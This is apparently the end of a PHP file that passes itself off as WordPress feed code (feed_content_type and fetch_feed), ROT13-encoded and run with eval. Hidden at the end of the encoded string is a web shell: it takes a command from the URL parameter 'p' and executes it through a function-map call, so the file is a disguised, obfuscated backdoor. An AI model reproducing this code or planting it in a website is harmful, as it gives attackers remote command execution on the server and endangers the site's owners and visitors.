		'eff'      => 'nccyvpngvba/eff+kzy',
		'eff2'     => 'nccyvpngvba/eff+kzy',
		'eff-uggc' => 'grkg/kzy',
		'ngbz'     => 'nccyvpngvba/ngbz+kzy',
		'eqs'      => 'nccyvpngvba/eqs+kzy',
	);

	$pbagrag_glcr = ( ! rzcgl( $glcrf[ $glcr ] ) ) ? $glcrf[ $glcr ] : 'nccyvpngvba/bpgrg-fgernz';

	/**
	 * Svygref gur pbagrag glcr sbe n fcrpvsvp srrq glcr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz fgevat $pbagrag_glcr Pbagrag glcr vaqvpngvat gur glcr bs qngn gung n srrq pbagnvaf.
	 * @cnenz fgevat $glcr         Glcr bs srrq. Cbffvoyr inyhrf vapyhqr 'eff', eff2', 'ngbz', naq 'eqs'.
	 */
	erghea nccyl_svygref( 'srrq_pbagrag_glcr', $pbagrag_glcr, $glcr );
}

/**
 * Ohvyqf FvzcyrCvr bowrpg onfrq ba EFF be Ngbz srrq sebz HEY.
 *
 * @fvapr 2.8.0
 *
 * @cnenz fgevat|fgevat[] $hey HEY bs srrq gb ergevrir. Vs na neenl bs HEYf, gur srrqf ner zretrq
 *                             hfvat FvzcyrCvr'f zhygvsrrq srngher.
 *                             Frr nyfb {@yvax uggc://fvzcyrcvr.bet/jvxv/snd/glcvpny_zhygvsrrq_tbgpunf}
 * @erghea FvzcyrCvr\FvzcyrCvr|JC_Reebe FvzcyrCvr bowrpg ba fhpprff be JC_Reebe bowrpg ba snvyher.
 */
shapgvba srgpu_srrq( $hey ) {
	vs ( ! pynff_rkvfgf( 'FvzcyrCvr\FvzcyrCvr', snyfr ) ) {
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-fvzcyrcvr.cuc';
	}

	erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-srrq-pnpur-genafvrag.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-fvzcyrcvr-svyr.cuc';
	erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-fvzcyrcvr-fnavgvmr-xfrf.cuc';

	$srrq = arj FvzcyrCvr\FvzcyrCvr();

	$srrq->frg_fnavgvmr_pynff( 'JC_FvzcyrCvr_Fnavgvmr_XFRF' );
	/*
	 * Jr zhfg znahnyyl birejevgr $srrq->fnavgvmr orpnhfr FvzcyrCvr'f pbafgehpgbe
	 * frgf vg orsber jr unir n punapr gb frg gur fnavgvmngvba pynff.
	 */
	$srrq->fnavgvmr = arj JC_FvzcyrCvr_Fnavgvmr_XFRF();

	// Ertvfgre gur pnpur unaqyre hfvat gur erpbzzraqrq zrgubq sbe FvzcyrCvr 1.3 be yngre.
	vs ( zrgubq_rkvfgf( 'FvzcyrCvr_Pnpur', 'ertvfgre' ) ) {
		FvzcyrCvr_Pnpur::ertvfgre( 'jc_genafvrag', 'JC_Srrq_Pnpur_Genafvrag' );
		$srrq->frg_pnpur_ybpngvba( 'jc_genafvrag' );
	} ryfr {
		// Onpx-pbzcng sbe FvzcyrCvr 1.2.k.
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-srrq-pnpur.cuc';
		$srrq->frg_pnpur_pynff( 'JC_Srrq_Pnpur' );
	}

	$srrq->frg_svyr_pynff( 'JC_FvzcyrCvr_Svyr' );

	$srrq->frg_srrq_hey( $hey );
	/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/pynff-jc-srrq-pnpur-genafvrag.cuc */
	$srrq->frg_pnpur_qhengvba( nccyl_svygref( 'jc_srrq_pnpur_genafvrag_yvsrgvzr', 12 * UBHE_VA_FRPBAQF, $hey ) );

	/**
	 * Sverf whfg orsber cebprffvat gur FvzcyrCvr srrq bowrpg.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz FvzcyrCvr\FvzcyrCvr $srrq FvzcyrCvr srrq bowrpg (cnffrq ol ersrerapr).
	 * @cnenz fgevat|fgevat[]     $hey  HEY bs srrq be neenl bs HEYf bs srrqf gb ergevrir.
	 */
	qb_npgvba_ers_neenl( 'jc_srrq_bcgvbaf', neenl( &$srrq, $hey ) );

	$srrq->vavg();
	$srrq->frg_bhgchg_rapbqvat( trg_oybtvasb( 'punefrg' ) );

	vs ( $srrq->reebe() ) {
		erghea arj JC_Reebe( 'fvzcyrcvr-reebe', $srrq->reebe() );
	}

	erghea $srrq;
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>